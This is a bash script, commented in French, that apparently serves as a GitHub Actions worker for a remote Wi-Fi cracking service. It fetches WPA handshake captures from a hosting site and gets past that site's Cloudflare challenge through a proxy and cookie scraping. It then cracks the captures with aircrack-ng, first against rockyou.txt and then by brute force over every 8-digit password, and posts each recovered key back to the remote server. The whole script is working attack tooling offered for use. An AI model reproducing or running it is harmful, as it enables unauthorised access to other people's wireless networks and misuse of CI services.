#!/bin/bash
SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"

COOKIE_JAR="/tmp/byethost_cookies_$$.txt"
HEADERS_FILE="/tmp/byethost_headers_$$.txt"
CHALLENGE_FILE="/tmp/challenge_$$.html"

# ── Configuration du proxy ───────────────────────────────
# Utilise la variable d'environnement PROXY (passée via GitHub Secrets)
# Format : http://user:password@host:port
PROXY="${PROXY:-}"
PROXY_CURL=""
if [ -n "$PROXY" ]; then
    PROXY_CURL="-x $PROXY"
    echo "[+] Proxy configuré : $(echo "$PROXY" | sed 's/:[^:@]*@/:****@/')"
else
    echo "[-] Aucun proxy configuré, connexion directe"
fi
# ─────────────────────────────────────────────────────────

cleanup() {
    rm -f "$COOKIE_JAR" "$HEADERS_FILE" "$CHALLENGE_FILE" \
          /tmp/check_result.txt /tmp/rockyou_dl.txt capture_*.cap \
          result.txt wordlist_custom.txt 2>/dev/null
}
trap cleanup EXIT

# ─────────────────────────────────────────────────────────
# Acquisition du cookie de session ByetHost
# ─────────────────────────────────────────────────────────
acquire_byethost_cookie() {
    echo "[*] Acquisition cookie de session ByetHost..." >&2

    # Test préalable : le proxy répond-il ?
    if [ -n "$PROXY" ]; then
        local TEST_PROXY
        TEST_PROXY=$(curl -s --max-time 10 $PROXY_CURL -A "$UA" \
            "https://httpbin.org/ip" 2>/dev/null)
        if [ -n "$TEST_PROXY" ]; then
            echo "[+] Proxy OK — IP de sortie : $(echo "$TEST_PROXY" | grep -oP '"origin":"\K[^"]+')" >&2
        else
            echo "[!] Proxy semble indisponible, tentative sans proxy..." >&2
        fi
    fi

    # Requête vers la racine ByetHost via le proxy
    curl -s $PROXY_CURL -c "$COOKIE_JAR" -D "$HEADERS_FILE" -A "$UA" \
        -o "$CHALLENGE_FILE" -L --max-redirs 3 \
        "${SITE_URL}/" > /dev/null 2>&1

    # Méthode 1 : Cookie __test dans le jar
    local COOKIE_VAL
    COOKIE_VAL=$(grep -E "__test" "$COOKIE_JAR" 2>/dev/null | tail -1 | awk '{print $NF}')
    if [ -n "$COOKIE_VAL" ]; then
        echo "[+] Cookie __test trouvé dans le jar: ${COOKIE_VAL}" >&2
        echo "$COOKIE_VAL"
        return 0
    fi

    # Méthode 2 : Depuis l'en-tête Set-Cookie
    COOKIE_VAL=$(grep -i "Set-Cookie.*__test" "$HEADERS_FILE" 2>/dev/null | \
        sed 's/.*__test=\([^;]*\).*/\1/' | head -1)
    if [ -n "$COOKIE_VAL" ]; then
        echo "[+] Cookie __test extrait du header: ${COOKIE_VAL}" >&2
        echo "$COOKIE_VAL"
        return 0
    fi

    # Méthode 3 : Depuis le JS challenge
    COOKIE_VAL=$(grep -oP 'document\.cookie\s*=\s*["'"'"'][^"'\"']*__test=\K[^"'"'"';]+' "$CHALLENGE_FILE" 2>/dev/null | head -1)
    if [ -n "$COOKIE_VAL" ]; then
        echo "[+] Cookie __test extrait du JS: ${COOKIE_VAL}" >&2
        echo "$COOKIE_VAL"
        return 0
    fi

    echo "[-] Aucun cookie __test trouvé." >&2
    echo "[-] Extrait de la réponse (10 lignes) :" >&2
    head -10 "$CHALLENGE_FILE" 2>/dev/null | sed 's/^/    /' >&2
    return 1
}

# Wrapper curl avec proxy + cookie
curl_api() {
    curl -s $PROXY_CURL -b "$COOKIE_JAR" -c "$COOKIE_JAR" -A "$UA" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: en-US,en;q=0.9" \
        --max-time 30 \
        "$@"
}

curl_post() {
    curl -s $PROXY_CURL -b "$COOKIE_JAR" -c "$COOKIE_JAR" -A "$UA" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: en-US,en;q=0.9" \
        --max-time 30 \
        -X POST --data-urlencode "$@"
}

report() {
    local msg="$1"
    local encoded
    encoded=$(echo "$msg" | sed 's/ /%20/g; s/é/e/g; s/è/e/g; s/ê/e/g; s/à/a/g; s/ù/u/g; s/ç/c/g; s/â/a/g; s/î/i/g; s/ô/o/g; s/û/u/g')
    curl -s $PROXY_CURL -b "$COOKIE_JAR" -c "$COOKIE_JAR" -A "$UA" -o /dev/null \
        --max-time 30 \
        "${SITE_URL}/api_progress.php?token=${TOKEN}&job_id=${JOB_ID}&progress=${encoded}" \
        2>/dev/null || true
}

# ═════════════════════════════════════════════════════════
#                     PROGRAMME PRINCIPAL
# ═════════════════════════════════════════════════════════

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║        WiFi Crack Worker - v2.2 (Proxy)              ║"
echo "║        $(date -u)                    ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

if [ -n "$GITHUB_ACTIONS" ]; then
    echo "  ⚡ Environnement : GitHub Actions"
    echo "  🔒 Proxy : $( [ -n "$PROXY" ] && echo 'OUI' || echo 'NON (direct)')"
    echo ""
fi

# ═════════════════════════════════════════════════════════
# ÉTAPE 0 : ACQUISITION COOKIE
# ═════════════════════════════════════════════════════════

echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 0 : Session ByetHost"
echo "──────────────────────────────────────────────────────"
echo ""

acquire_byethost_cookie
COOKIE_EXIT_CODE=$?

if [ "$COOKIE_EXIT_CODE" -ne 0 ]; then
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║  ⚠️  PAS DE COOKIE DE SESSION                               ║"
    echo "║                                                              ║"
    echo "║  Le challenge Cloudflare/ByetHost est toujours actif.       ║"
    echo "║                                                              ║"
    echo "║  ➜  Vérifiez que votre proxy Webshare fonctionne :         ║"
    echo "║      Testez-le sur https://httpbin.org/ip                   ║"
    echo "║                                                              ║"
    echo "║  ➜  Si le proxy fonctionne mais que le cookie échoue :      ║"
    echo "║      Passez en mode 'cookie statique' (Solution 1)          ║"
    echo "║      en ajoutant un secret BYETHOST_COOKIE                  ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
fi

# ═════════════════════════════════════════════════════════
# ÉTAPE 1 : VÉRIFICATION DES JOBS
# ═════════════════════════════════════════════════════════

echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 1 : Vérification des jobs"
echo "──────────────────────────────────────────────────────"
echo ""

RESPONSE=$(curl_api "${SITE_URL}/api_status.php?token=${TOKEN}")
echo "  Réponse brute : [${RESPONSE}]"
echo ""

# Détection HTML (challenge Cloudflare)
if echo "$RESPONSE" | grep -qi "<html\|<script\|<body\|cf-browser-verify\|cf-chl\|__cf_chl\|challenge-platform"; then
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║  ❌  CLOUDFLARE CHALLENGE ENCORE DÉTECTÉ                   ║"
    echo "║                                                              ║"
    echo "║  Le proxy n'a pas suffi ou est bloqué.                     ║"
    echo "║                                                              ║"
    echo "║  ➜  Essayez de changer le proxy dans la liste Webshare    ║"
    echo "║  ➜  Ou passez à la Solution 1 (cookie statique)            ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    exit 0
fi

if [ -z "$RESPONSE" ]; then
    echo "  ❌ Réponse vide — proxy ou serveur injoignable"
    exit 0
fi

if ! echo "$RESPONSE" | jq . >/dev/null 2>&1; then
    echo "  ❌ Réponse non-JSON reçue"
    echo "  Contenu : ${RESPONSE}"
    exit 0
fi

JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id' 2>/dev/null)
ESSID=$(echo "$RESPONSE" | jq -r '.job.essid // ""' 2>/dev/null)

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "  ✅ Aucune tâche en attente."
    exit 0
fi

echo "  ✅ Job #${JOB_ID} trouvé !"
echo "     ESSID : '${ESSID}'"
echo ""

# ═════════════════════════════════════════════════════════
# ÉTAPE 2 à 5 : IDENTIQUE À LA VERSION PRÉCÉDENTE
# ═════════════════════════════════════════════════════════

report "Telechargement du fichier"
curl_api -o "capture_${JOB_ID}.cap" \
    "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    echo "  ❌ Fichier vide ou introuvable"
    report "Fichier vide"
    curl_post "id=${JOB_ID}&status=failed&password=" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
    exit 0
fi

SIZE=$(stat -c%s "capture_${JOB_ID}.cap" 2>/dev/null || stat -f%z "capture_${JOB_ID}.cap" 2>/dev/null || wc -c < "capture_${JOB_ID}.cap" 2>/dev/null || echo "?")
echo "  ✅ Téléchargé : ${SIZE} octets"
report "Fichier telecharge (${SIZE} octets)"
echo ""

echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 3 : Vérification du handshake"
echo "──────────────────────────────────────────────────────"
echo ""

aircrack-ng "capture_${JOB_ID}.cap" > /tmp/check_result.txt 2>&1
cat /tmp/check_result.txt
echo ""

if ! grep -q "WPA (1 handshake)" /tmp/check_result.txt; then
    echo "  ❌ Pas de handshake WPA valide"
    report "Pas de handshake valide"
    curl_post "id=${JOB_ID}&status=failed&password=" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
    rm -f "capture_${JOB_ID}.cap" /tmp/check_result.txt
    exit 0
fi

echo "  ✅ Handshake valide détecté !"
echo ""

echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 4 : Attaque dictionnaire rockyou.txt"
echo "──────────────────────────────────────────────────────"
echo ""

report "Test rockyou.txt"

ARGS=""
[ -n "$ESSID" ] && ARGS="-e \"$ESSID\""

aircrack-ng -w /usr/share/wordlists/rockyou.txt $ARGS \
    "capture_${JOB_ID}.cap" > result.txt 2>&1

if grep -q "KEY FOUND" result.txt; then
    PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
    echo "  ✅ Mot de passe trouvé (rockyou) : [${PWD}]"
    echo ""
    report "Mot de passe trouve"
    curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
    rm -f "capture_${JOB_ID}.cap" result.txt /tmp/check_result.txt wordlist_custom.txt 2>/dev/null
    exit 0
fi

echo "  ❌ Pas trouvé dans rockyou.txt"
echo ""

echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 5 : Force brute 8 chiffres"
echo "──────────────────────────────────────────────────────"
echo ""

report "Force brute 8 chiffres en cours"
echo "  Génération de la wordlist avec crunch..."
crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null

if [ -f wordlist_custom.txt ] && [ -s wordlist_custom.txt ]; then
    echo "  Wordlist générée. Lancement du cracking..."
    report "Force brute en cours"

    aircrack-ng -w wordlist_custom.txt $ARGS \
        "capture_${JOB_ID}.cap" > result.txt 2>&1

    if grep -q "KEY FOUND" result.txt; then
        PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
        echo "  ✅ Mot de passe trouvé (brute force) : [${PWD}]"
        echo ""
        report "Mot de passe trouve"
        curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" \
            "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
        rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt
        exit 0
    fi

    echo "  ❌ Force brute échec"
    report "Force brute echec"
else
    echo "  ❌ crunch n'a pas généré la wordlist"
    report "Crunch a echoue"
fi

echo ""

echo "╔══════════════════════════════════════════════════════╗"
echo "║  ❌ ÉCHEC — Mot de passe non trouvé                 ║"
echo "╚══════════════════════════════════════════════════════╝"

curl_post "id=${JOB_ID}&status=failed&password=" \
    "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true

rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt 2>/dev/null

echo ""
echo "  ✅ Worker terminé."
echo ""
